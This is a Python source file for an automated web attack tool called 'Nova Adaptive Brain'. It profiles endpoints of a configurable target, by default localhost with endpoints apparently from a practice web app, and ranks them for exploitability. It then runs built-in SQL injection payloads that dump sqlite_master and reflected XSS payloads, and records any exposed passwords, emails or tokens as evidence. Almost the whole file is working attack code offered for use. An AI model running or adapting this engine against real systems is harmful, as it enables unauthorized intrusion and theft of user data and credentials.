#!/usr/bin/env python3
"""
NOVA ADAPTIVE BRAIN v1.0
Context-aware adaptive attack engine.
Reads responses, understands application behavior,
and dynamically adjusts attack strategy.
This is the module that closes the gap.
"""

import json
import re
import time
import requests
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse


class NovaAdaptiveBrain:
    """
    The thinking layer. Instead of blind spraying, Nova now:
    1. Probes endpoints to understand behavior
    2. Maps valid vs invalid responses
    3. Extracts dynamic parameters, tokens, CSRF
    4. Builds context-aware attack strategies
    5. Validates findings with evidence chains
    """

    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Nova/5.0 (Adaptive Brain)",
            "Accept": "text/html,application/json,*/*",
        })
        
        # Knowledge base
        self.application_map = {}  # Endpoint behavior profiles
        self.valid_patterns = {}   # What "normal" looks like
        self.tokens_found = []     # CSRF tokens, nonces, etc
        self.attack_surface = []   # Prioritized targets
        self.evidence_chain = []   # Proof of exploitation
        
        # Context patterns
        self.error_patterns = {
            "sql": [r"SQL", r"sqlite", r"mysql", r"postgresql", r"ORA-", r"syntax error", r"unclosed quote"],
            "stack": [r"at ", r"node_modules", r"\.js:\d+:\d+", r"Traceback", r"Error\n"],
            "path": [r"/home/", r"/var/", r"/opt/", r"/data/", r"\/usr\/", r"internal/"],
            "debug": [r"debug", r"dump", r"\.log", r"console\."],
            "auth": [r"token", r"Bearer", r"authorization", r"login", r"session"],
        }

    # ---------- BEHAVIORAL PROFILING ----------
    def profile_endpoint(self, endpoint: str, method: str = "GET", 
                         params: Dict = None, data: Dict = None) -> Dict:
        """
        Send probe requests and build a behavioral profile of an endpoint.
        Maps: valid params, error conditions, response patterns.
        """
        profile = {
            "endpoint": endpoint,
            "method": method,
            "normal_response": None,
            "error_response": None,
            "valid_params": [],
            "reflected_params": [],
            "tokens_found": [],
            "security_headers": {},
            "behavior": {},
            "attack_surface_rating": "unknown",
        }

        url = f"{self.base_url}{endpoint}"

        # Probe 1: Baseline normal request
        try:
            if method == "GET":
                resp = self.session.get(url, params=params or {}, timeout=10)
            else:
                resp = self.session.post(url, json=data or {}, timeout=10)
            
            profile["normal_response"] = {
                "status": resp.status_code,
                "length": len(resp.text),
                "content_type": resp.headers.get("content-type", ""),
            }
            profile["security_headers"] = {
                "x-frame-options": resp.headers.get("x-frame-options", "missing"),
                "x-content-type-options": resp.headers.get("x-content-type-options", "missing"),
                "csp": resp.headers.get("content-security-policy", "missing"),
            }
        except Exception as e:
            profile["normal_response"] = {"error": str(e)[:100]}

        # Probe 2: Invalid data to trigger errors
        try:
            invalid_data = {"invalid_field": "'\"<script>"}
            if method == "GET":
                resp = self.session.get(url, params=invalid_data, timeout=10)
            else:
                resp = self.session.post(url, json=invalid_data, timeout=10)
            
            profile["error_response"] = {
                "status": resp.status_code,
                "length": len(resp.text),
            }

            # Check for information leakage
            for category, patterns in self.error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        profile["behavior"][f"leaks_{category}"] = True
                        profile["behavior"]["leak_preview"] = resp.text[:300]
        except Exception as e:
            pass

        # Probe 3: Test for parameter reflection
        if params:
            for param in params:
                try:
                    reflect_test = {param: "NOVA_REFLECT_TEST_12345"}
                    resp = self.session.get(url, params=reflect_test, timeout=10)
                    if "NOVA_REFLECT_TEST_12345" in resp.text:
                        profile["reflected_params"].append(param)
                except:
                    pass

        # Extract tokens
        try:
            resp = self.session.get(url, timeout=10)
            # CSRF tokens
            csrf_patterns = [
                r'csrf.*?value=["\']([^"\']+)["\']',
                r'_csrf.*?["\']([^"\']+)["\']',
                r'nonce.*?["\']([^"\']+)["\']',
            ]
            for pattern in csrf_patterns:
                matches = re.findall(pattern, resp.text, re.IGNORECASE)
                for match in matches:
                    profile["tokens_found"].append({"type": "csrf", "value": match})

            # Hidden input fields
            hidden_pattern = r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']'
            hidden_matches = re.findall(hidden_pattern, resp.text, re.IGNORECASE)
            for name, value in hidden_matches:
                profile["tokens_found"].append({"type": "hidden_field", "name": name, "value": value})
        except:
            pass

        # Rate attack surface
        score = 0
        if profile.get("behavior", {}).get("leaks_sql"): score += 30
        if profile.get("behavior", {}).get("leaks_stack"): score += 25
        if profile.get("behavior", {}).get("leaks_path"): score += 20
        if profile.get("behavior", {}).get("leaks_debug"): score += 15
        if profile["reflected_params"]: score += 10
        if profile["tokens_found"]: score += 5
        
        if score >= 30:
            profile["attack_surface_rating"] = "CRITICAL"
        elif score >= 20:
            profile["attack_surface_rating"] = "HIGH"
        elif score >= 10:
            profile["attack_surface_rating"] = "MEDIUM"
        else:
            profile["attack_surface_rating"] = "LOW"

        profile["attack_score"] = score
        self.application_map[endpoint] = profile
        return profile

    # ---------- SURFACE MAPPING ----------
    def map_attack_surface(self, endpoints: List[str] = None) -> List[Dict]:
        """Profile all endpoints and rank by exploitability."""
        if endpoints is None:
            endpoints = [
                "/rest/products/search",
                "/rest/user/login", 
                "/rest/user/register",
                "/rest/user/whoami",
                "/rest/user/change-password",
                "/api/Feedbacks",
                "/api/Users",
                "/rest/basket/1",
                "/rest/admin/application-configuration",
                "/rest/admin/application-version",
                "/file-serving",
                "/rest/order-history",
            ]

        print("""
╔══════════════════════════════════════════════╗
║   🧠 NOVA ADAPTIVE BRAIN v1.0              ║
║   Behavioral Profiling & Surface Mapping   ║
╚══════════════════════════════════════════════╝
        """)

        for endpoint in endpoints:
            profile = self.profile_endpoint(endpoint)
            rating = profile["attack_surface_rating"]
            leaks = [k.replace("leaks_", "") for k in profile.get("behavior", {}).keys() if k.startswith("leaks_")]
            
            symbol = {"CRITICAL": "🔥", "HIGH": "⚠️", "MEDIUM": "📋", "LOW": "✅"}.get(rating, "❓")
            
            print(f"  {symbol} [{rating:8}] {endpoint:<40} Score:{profile['attack_score']:>3}", end="")
            if leaks:
                print(f" | Leaks: {', '.join(leaks)}", end="")
            if profile["reflected_params"]:
                print(f" | Reflected: {profile['reflected_params']}", end="")
            if profile["tokens_found"]:
                print(f" | Tokens: {len(profile['tokens_found'])}", end="")
            print()

        # Sort by attack score
        self.attack_surface = sorted(
            [p for p in self.application_map.values()],
            key=lambda x: x.get("attack_score", 0),
            reverse=True
        )

        return self.attack_surface

    # ---------- ADAPTIVE EXPLOITATION ----------
    def adaptive_exploit(self, profile: Dict) -> List[Dict]:
        """
        Based on behavioral profile, choose and execute the optimal attack.
        """
        findings = []
        endpoint = profile["endpoint"]
        leaks = profile.get("behavior", {})

        # If SQL errors leaked, go for SQL injection
        if leaks.get("leaks_sql"):
            print(f"\n  🎯 Adaptive: SQL Injection on {endpoint}")
            payloads = [
                "' OR 1=1--",
                "') OR ('1'='1",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT sql,2,3 FROM sqlite_master--",
                "' UNION SELECT tbl_name,2,3 FROM sqlite_master WHERE type='table'--",
                "' UNION SELECT sql,2,3,4,5,6,7,8 FROM sqlite_master--",
            ]
            for payload in payloads:
                try:
                    resp = self.session.get(f"{self.base_url}{endpoint}", 
                        params={"q": payload}, timeout=10)
                    if resp.status_code == 200:
                        # Check for data extraction
                        sensitive_indicators = ["password", "email", "admin", "secret", "credit", "token"]
                        found = [i for i in sensitive_indicators if i in resp.text.lower()]
                        if found:
                            findings.append({
                                "type": "sql_injection",
                                "endpoint": endpoint,
                                "payload": payload,
                                "data_exposed": found,
                                "response_length": len(resp.text),
                                "evidence": resp.text[:500],
                            })
                            print(f"     🔥 DATA EXTRACTED: {found}")
                            # Save evidence
                            self.evidence_chain.append(findings[-1])
                            break
                except:
                    continue

        # If stack traces leaked, probe for more info
        if leaks.get("leaks_stack"):
            print(f"\n  🎯 Adaptive: Stack Trace Mining on {endpoint}")
            error_probes = [
                {"q": "''"},
                {"q": "1/0"},
                {"q": "undefined"},
                {"q": "NaN"},
            ]
            for probe in error_probes:
                try:
                    resp = self.session.get(f"{self.base_url}{endpoint}", params=probe, timeout=10)
                    # Extract file paths from stack traces
                    file_paths = re.findall(r'(?:File\s+["\']?|at\s+)((?:/[^\s:"]+)+)', resp.text)
                    if file_paths:
                        findings.append({
                            "type": "path_disclosure",
                            "endpoint": endpoint,
                            "file_paths": file_paths,
                            "evidence": resp.text[:500],
                        })
                        print(f"     🔥 FILE PATHS DISCLOSED: {len(file_paths)} paths")
                        print(f"        {file_paths[0]}")
                        self.evidence_chain.append(findings[-1])
                        break
                except:
                    continue

        # If parameters reflected, test for XSS
        if profile.get("reflected_params"):
            for param in profile["reflected_params"]:
                print(f"\n  🎯 Adaptive: XSS Test on {endpoint}?{param}=")
                xss_payloads = [
                    "<script>alert('NOVA')</script>",
                    "<img src=x onerror=alert('NOVA')>",
                    '"><script>alert("NOVA")</script>',
                ]
                for payload in xss_payloads:
                    try:
                        resp = self.session.get(f"{self.base_url}{endpoint}", 
                            params={param: payload}, timeout=10)
                        if payload in resp.text:
                            findings.append({
                                "type": "xss_reflected",
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload,
                                "evidence": resp.text[:500],
                            })
                            print(f"     🔥 XSS CONFIRMED on parameter '{param}'")
                            self.evidence_chain.append(findings[-1])
                            break
                    except:
                        continue
                break  # One reflected param is enough

        return findings

    # ---------- FULL ADAPTIVE MISSION ----------
    def run_adaptive_mission(self) -> Dict:
        """Full adaptive attack: profile, rank, exploit, validate."""
        
        # Phase 1: Map surface
        print("\n📡 PHASE 1: SURFACE MAPPING")
        surface = self.map_attack_surface()
        
        # Phase 2: Prioritize
        print(f"\n📊 PHASE 2: TARGET PRIORITIZATION")
        critical_targets = [p for p in surface if p["attack_surface_rating"] in ["CRITICAL", "HIGH"]]
        print(f"   Critical/High targets: {len(critical_targets)}")
        for t in critical_targets:
            print(f"   🎯 {t['endpoint']} (Score: {t['attack_score']})")

        # Phase 3: Adaptive exploit
        print(f"\n💥 PHASE 3: ADAPTIVE EXPLOITATION")
        all_findings = []
        for target in critical_targets[:5]:  # Top 5 targets
            findings = self.adaptive_exploit(target)
            all_findings.extend(findings)
            time.sleep(0.2)

        # Phase 4: Evidence compilation
        print(f"\n📝 PHASE 4: EVIDENCE COMPILATION")
        report = {
            "timestamp": datetime.now().isoformat(),
            "target": self.base_url,
            "endpoints_profiled": len(self.application_map),
            "critical_targets": len(critical_targets),
            "findings": all_findings,
            "evidence_chain": self.evidence_chain,
            "attack_summary": {},
        }

        # Categorize
        for finding in all_findings:
            ftype = finding.get("type", "unknown")
            if ftype not in report["attack_summary"]:
                report["attack_summary"][ftype] = 0
            report["attack_summary"][ftype] += 1

        # Save
        with open("nova_adaptive_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)

        print(f"""
╔══════════════════════════════════════════╗
║     ADAPTIVE MISSION COMPLETE           ║
╠══════════════════════════════════════════╣
║  Endpoints Profiled:  {len(self.application_map):>2}               ║
║  Critical Targets:    {len(critical_targets):>2}               ║
║  Findings:            {len(all_findings):>2}               ║
╚══════════════════════════════════════════╝
        """)

        if all_findings:
            print("\n🔥 CONFIRMED VULNERABILITIES:")
            for finding in all_findings:
                print(f"   💥 [{finding['type'].upper()}] {finding['endpoint']}")
                if "data_exposed" in finding:
                    print(f"      Exposed: {finding['data_exposed']}")
                if "file_paths" in finding:
                    print(f"      Paths: {len(finding['file_paths'])} files")
        else:
            print("\n⚠️ No new findings. Surface mapped for future attacks.")

        return report


if __name__ == "__main__":
    brain = NovaAdaptiveBrain(base_url="http://localhost:3000")
    report = brain.run_adaptive_mission()
